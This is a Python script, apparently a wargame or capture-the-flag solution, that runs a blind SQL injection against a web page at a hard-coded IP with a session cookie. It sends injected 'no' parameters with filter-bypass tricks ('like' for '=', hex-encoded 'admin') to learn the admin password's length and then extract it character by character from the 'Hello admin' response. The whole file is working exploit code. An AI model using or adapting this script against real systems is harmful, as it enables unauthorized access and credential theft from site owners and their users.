import requests
import string

url = 'http://43.201.45.211/?'
cookies={'PHPSESSID':'fd4d1bt6c32a9i29r743nmk7hs'}

def password_length():
    len_pw=0
    while 1 :
        len_pw += 1
        print(len_pw)
        value = "1 || id like \"admin\" && length(pw) like {} #".format(len_pw)
        params={'no':value}
        response = requests.get(url, params=params, cookies=cookies)
        if "Hello admin" in response.text:
            print("password length : ", len_pw)
            break
    return len_pw


def find_pw(len_pw):
    pw=''
    for i in range(1,len_pw+1):
        print(i,"번째 찾는 중")
        for j in string.printable:
            value = "1 or id like 0x61646d696e and ord(mid(pw, {} , 1)) like {} #".format(i, ord(j))
            params={"no":value}
            response = requests.get(url,params=params, cookies=cookies)
            print(value)
            if "Hello admin" in response.text:
                pw += j
                print("password : ",pw)
                break
  
find_pw(password_length())